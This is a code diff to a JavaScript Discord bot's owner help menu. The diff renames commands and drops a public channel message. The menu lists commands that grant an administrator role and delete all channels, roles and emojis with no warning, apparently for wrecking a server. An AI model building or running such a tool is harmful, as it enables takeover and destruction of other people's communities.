@@ -10,8 +10,8 @@ module.exports = {
         .setColor('#304281')
         .setTitle('Help (Owner) ')
         .addFields(
-            {name: 'Owner Help Command', value: "owner"},
-            {name: 'Create Administrator Role and Give', value: "ace"},
+            {name: 'Owner Help Command', value: "ohelp"},
+            {name: 'Create Administrator Role and Give', value: "arole"},
             {name: 'Delete all Channels (NO WARNING)', value: "dchannel"},
             {name: 'Delete all roles (NO WARNING)', value: "drole"},
             {name: 'Delete all emojis (NO WARNING)', value: "demoji"},
@@ -20,8 +20,7 @@ module.exports = {
         .setFooter('w');
 
         message.author.send(newEmbed)
-        console.log('Ran ohlp command. (SUCCESS)'); 
-        message.channel.send("W");
+        console.log('Ran ohelp command. (SUCCESS)'); 
     }
     
 }
